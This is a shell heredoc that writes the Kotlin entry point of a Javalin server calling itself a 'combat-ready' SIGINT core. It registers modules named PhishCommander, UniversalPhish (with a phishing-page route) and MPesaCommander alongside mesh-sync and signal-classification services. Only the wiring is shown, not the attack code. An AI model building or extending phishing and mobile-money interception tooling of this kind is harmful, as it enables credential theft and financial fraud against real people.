cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
package com.fardc.sigint.core

import com.fardc.sigint.services.dsp.SignalClassifier 
import com.fardc.sigint.core.sync.MeshSyncEngine
import com.fardc.sigint.services.transmission.FallbackTransmitter
import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.4.0 (FULL-COMBAT-READY) boot OK")

    val vault = SecurityVault() 
    val combatHandler = CombatModeHandler() 
    val reporter = MissionReporter(vault)

    // Initialisation de la Résilience et de l'IA
    val meshEngine = MeshSyncEngine(vault, combatHandler)
    val fallbackTx = FallbackTransmitter(vault, combatHandler)
    val aiEngine = SignalClassifier(vault, combatHandler)

    // Initialisation des Modules SIGINT
    val bft = BFTModule(combatHandler)
    val mpesa = MPesaCommander(vault, combatHandler)
    val phish = PhishCommander(vault, combatHandler)
    val universal = UniversalPhish(vault, combatHandler)

    val app = Javalin.create { config ->
        config.showJavalinBanner = false
        config.http.defaultContentType = "application/json; charset=utf-8"
    }.start(7070)

    // Enregistrement des Routes
    combatHandler.setupRoutes(app)
    meshEngine.setup(app)
    bft.setup(app)
    mpesa.setup(app)
    phish.setupPhishPage(app)
    universal.setup(app)

    app.post("/api/ai/classify") { ctx ->
        ctx.json(aiEngine.processInference(ctx.bodyAsBytes()))
    }

    app.get("/status") { ctx -> 
        ctx.json(mapOf(
            "system" to "SOVEREIGN-CORE V2.4.0",
            "combat_mode" to combatHandler.getStatus(),
            "ai_engine" to "READY",
            "mesh_status" to "SYNCING",
            "timestamp" to Instant.now().toString()
        ))
    }
}
EOF
